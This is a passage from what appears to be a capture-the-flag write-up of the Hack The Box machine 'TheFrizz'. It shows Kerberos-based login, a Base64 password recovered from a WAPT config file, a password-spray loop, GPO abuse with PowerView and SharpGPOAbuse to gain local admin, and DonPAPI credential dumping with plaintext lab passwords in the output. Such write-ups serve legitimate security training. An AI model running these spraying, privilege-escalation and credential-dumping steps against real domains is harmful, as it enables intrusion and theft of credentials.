+SMB         frizz.htb       445    frizz            [*]  x64 (name:frizz) (domain:htb) (signing:True) (SMBv1:False)
+SMB         frizz.htb       445    frizz            [-] frizz.htb\ from ccache STATUS_MORE_PROCESSING_REQUIRED</code></pre>
+</doc-codeblock></div>
+<p>I still got errors, so I tried using SSH since this port is open. First make sure that the <code v-pre>/etc/krb5.conf</code> looks as follows:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[libdefault]
+        default_realm = FRIZZDC.FRIZZ.HTB
+        dns_lookup_realm = false
+        dns_lookup_kdc = true
+        ticket_lifetime = 24h
+        forwardable = true
+
+[realms]
+        FRIZZ.HTB = {
+                kdc = frizzdc.frizz.htb
+                admin_server = frizzdc.frizz.htb
+        }
+
+[domain_realm]
+        frizz.htb = FRIZZ.HTB
+        .frizz.htb = FRIZZ.HTB</code></pre>
+</doc-codeblock></div>
+<p>Next we can connect.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=f.frizzle.ccache ssh f.frizzle@frizz.htb
+PS C:\Users\f.frizzle&gt; cat Desktop\user.txt</code></pre>
+</doc-codeblock></div>
+<p>Alternatively, we can also use EvilWinRM.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=f.frizzle.ccache evil-winrm -i frizzdc.frizz.htb -r FRIZZ.HTB
+*Evil-WinRM* PS C:\Users\f.frizzle\Documents&gt;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h2>
+</doc-anchor-target>
+<p>First we can try running SharpHound and import our data into BloodHound CE but there is not something that jumps out. For the next part I was stuck for a while enumerating every single directory. Eventually I stumbled upon a file in the recycle bin:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\f.frizzle&gt; cmd /c cmd.exe
+Microsoft Windows [Version 10.0.20348.3207]
+(c) Microsoft Corporation. All rights reserved.
+
+frizz\f.frizzle@FRIZZDC C:\Users\f.frizzle&gt; cd C:\$Recycle.Bin
+frizz\f.frizzle@FRIZZDC C:\$RECYCLE.BIN&gt; dir /a
+
+10/29/2024  07:31 AM    &lt;DIR&gt;          .
+03/10/2025  03:39 PM    &lt;DIR&gt;          ..
+10/29/2024  07:31 AM    &lt;DIR&gt;          S-1-5-21-2386970044-1145388522-2932701813-1103
+
+frizz\f.frizzle@FRIZZDC C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103&gt; dir
+
+10/29/2024  07:31 AM               148 $IE2XMEG.7z
+10/24/2024  09:16 PM        30,416,987 $RE2XMEG.7z</code></pre>
+</doc-codeblock></div>
+<p>Here we find two files. I downloaded them to my local machine and found that one of the contains the source code for WAPT that Fiona was talking about.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=f.frizzle.ccache scp 'f.frizzle@frizz.htb:C:\\$Recycle.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\\$RE2XMEG.7z' R.7z
+
+$ 7z x R.7z
+$ cat wapt/conf/waptserver.ini
+
+[options]
+allow_unauthenticated_registration = True
+wads_enable = True
+login_on_wads = True
+waptwua_enable = True
+secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
+server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
+token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
+wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
+clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
+clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt
+
+[tftpserver]
+root_dir = c:\wapt\waptserver\repository\wads\pxe
+log_path = c:\wapt\log</code></pre>
+</doc-codeblock></div>
+<p>The <code v-pre>waptserver.ini</code> contains a Base64 encoded password. We decode it and peform a password spray on the accounts.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\f.frizzle&gt; get-aduser -filter * | ft -property name
+
+name
+----
+Administrator
+Guest
+krbtgt
+f.frizzle
+w.li
+h.arm
+M.SchoolBus
+d.hudson
+k.franklin
+l.awesome
+t.wright
+r.tennelli
+J.perlstein
+a.perlstein
+p.terese
+v.frizzle
+g.frizzle
+c.sandiego
+c.ramon
+m.ramon
+w.Webservice
+
+$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
+!suBcig@MehTed!R
+
+$ while read u; do getTGT.py frizz.htb/$u:'!suBcig@MehTed!R' | grep ticket; done &lt; users.txt
+[*] Saving ticket in M.SchoolBus.ccache</code></pre>
+</doc-codeblock></div>
+<p>We were able to get the TGT of <code v-pre>M.SchoolBus</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=M.SchoolBus.ccache ssh M.SchoolBus@frizz.htb
+PS C:\Users\M.SchoolBus&gt;</code></pre>
+</doc-codeblock></div>
+<p>After not finding much on BloodHound, I started to proceed my enumeration with PowerView. First copy <code v-pre>PowerView.ps1</code> to the machine with scp and execute <code v-pre>powershell.exe</code> to be able to import the script.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=M.SchoolBus.ccache scp PowerView.ps1 M.SchoolBus@frizz.htb:C:\\Users\\M.SchoolBus
+
+PS C:\Users\M.SchoolBus&gt; powershell.exe
+PS C:\Users\M.SchoolBus&gt; . .\PowerView.ps1</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="gpo-abuse">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#gpo-abuse">#</doc-anchor-trigger>
+        <span>GPO Abuse</span>
+    </h3>
+</doc-anchor-target>
+<p>One topic that I learned recently is GPO abuse so I started to look if this account was able to link GPOs to the domain. Next I also looked at if there are users that can link GPOs to OUs.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\M.SchoolBus&gt; Get-DomainObjectAcl -SearchScope Base -ResolveGUIDs | where { $_.ObjectAceType -eq &quot;GP-Link&quot; -and $_.ActiveDirectoryRights -match &quot;WriteProperty&quot; } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List
+
+ObjectDN    : DC=frizz,DC=htb
+ResolvedSID : frizz\M.SchoolBus
+
+PS C:\Users\M.SchoolBus&gt; Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq &quot;GP-Link&quot; -and $_.ActiveDirectoryRights -match &quot;WriteProperty&quot; } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List
+
+ObjectDN    : OU=Domain Controllers,DC=frizz,DC=htb
+ResolvedSID : frizz\M.SchoolBus
+
+ObjectDN    : OU=Class_Frizz,DC=frizz,DC=htb
+ResolvedSID : frizz\M.SchoolBus</code></pre>
+</doc-codeblock></div>
+<p>We see that <code v-pre>M.SchoolBus</code> can link to the domain and both the <code v-pre>Domain Controllers</code> and <code v-pre>Class_Frizz</code> OUs. With these permissions we can elevate our privileges and add our account to the local administrators group.</p>
+<p>First we create a new GPO.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\M.SchoolBus&gt; New-GPO -Name &quot;NewGPO&quot; -Comment &quot;This is a test GPO&quot;
+
+DisplayName      : NewGPO
+DomainName       : frizz.htb
+Owner            : frizz\M.SchoolBus
+Id               : 42a6ef68-b465-4886-9872-eee1e3787879
+GpoStatus        : AllSettingsEnabled
+Description      : This is a test GPO
+CreationTime     : 3/16/2025 5:16:29 PM
+ModificationTime : 3/16/2025 5:16:29 PM
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 0, SysVol Version: 0
+WmiFilter        :</code></pre>
+</doc-codeblock></div>
+<p>Next we can link this GPO to a target OU, in this case the <code v-pre>Domain Controllers</code> OU.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\M.SchoolBus&gt; New-GPLink -Name &quot;NewGPO&quot; -Target &quot;OU=Domain Controllers,DC=FRIZZ,DC=HTB&quot;
+
+GpoId       : ccb9eb1b-ed08-4efc-89da-e65c2bcf6599
+DisplayName : NewGPO
+Enabled     : True
+Enforced    : False
+Target      : OU=Domain Controllers,DC=frizz,DC=htb
+Order       : 2</code></pre>
+</doc-codeblock></div>
+<p>Next we can run <code v-pre>SharpGPOAbuse.exe</code> to create a new local admin account.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\M.SchoolBus&gt; .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName NewGPO
+[+] Domain = frizz.htb
+[+] Domain Controller = frizzdc.frizz.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
+[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
+[+] GUID of &quot;NewGPO&quot; is: {CCB9EB1B-ED08-4EFC-89DA-E65C2BCF6599}
+[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{CCB9EB1B-ED08-4EFC-89DA-E65C2BCF6599}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+
+PS C:\Users\M.SchoolBus&gt; gpupdate /force
+
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+
+PS C:\Users\M.SchoolBus&gt; net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+M.SchoolBus
+The command completed successfully.</code></pre>
+</doc-codeblock></div>
+<p>In another session we can read the root flag.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Administrator\Desktop&gt; type root.txt</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="dumping-creds">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dumping-creds">#</doc-anchor-trigger>
+        <span>Dumping Creds</span>
+    </h3>
+</doc-anchor-target>
+<p>Next we dump all the credentials with DonPAPI.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=M.SchoolBus.ccache donpapi collect -k --no-pass -t frizzdc.frizz.htb
+[💀] [+] DonPAPI Version 2.0.1
+[💀] [+] Output directory at /home/s3rp3nt/.donpapi
+[💀] [+] Loaded 1 targets
+[💀] [+] Recover file available at /home/s3rp3nt/.donpapi/recover/recover_1742171384
+[frizzdc.frizz.htb] [+] Starting gathering credz
+[frizzdc.frizz.htb] [+] Dumping SAM
+[01:29:52] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.       secretsdump.py:1340
+[frizzdc.frizz.htb] [$] [SAM] Got 3 accounts
+[frizzdc.frizz.htb] [+] Dumping LSA
+[frizzdc.frizz.htb] [$] [LSA] (Unknown User):BananaB0at!!@
+[frizzdc.frizz.htb] [$] [LSA] (Unknown User):BananaB0at!!@
+[frizzdc.frizz.htb] [+] Dumping User and Machine masterkeys
+[frizzdc.frizz.htb] [$] [DPAPI] Got 5 masterkeys
+[frizzdc.frizz.htb] [+] Dumping User Chromium Browsers
+[frizzdc.frizz.htb] [+] Dumping User and Machine Certificates
+[frizzdc.frizz.htb] [+] Dumping User and Machine Credential Manager
+[frizzdc.frizz.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{021CAB75-2E8A-43B7-A27B-3E488E46505D} - frizz\v.frizzle:Remember0?Attempt?Depend?Was?Tape
+[frizzdc.frizz.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{C810CEE4-32F3-42A9-BDEF-16ADE0E28272} - frizz\f.frizzle:Jenni_Luvs_Magic23
+[frizzdc.frizz.htb] [+] Gathering recent files and desktop files
+[frizzdc.frizz.htb] [+] Dumping User Firefox Browser
+[frizzdc.frizz.htb] [+] Dumping MobaXterm credentials
+[frizzdc.frizz.htb] [+] Dumping MRemoteNg Passwords
+[frizzdc.frizz.htb] [+] Dumping User's RDCManager
+[frizzdc.frizz.htb] [+] Dumping SCCM Credentials
+[frizzdc.frizz.htb] [+] Dumping User and Machine Vaults
+[frizzdc.frizz.htb] [+] Dumping VNC Credentials
+[frizzdc.frizz.htb] [+] Dumping Wifi profiles
+DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/office/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Office (Hard)</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/university/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">University (Insane)</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "TheFrizz (Medium)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
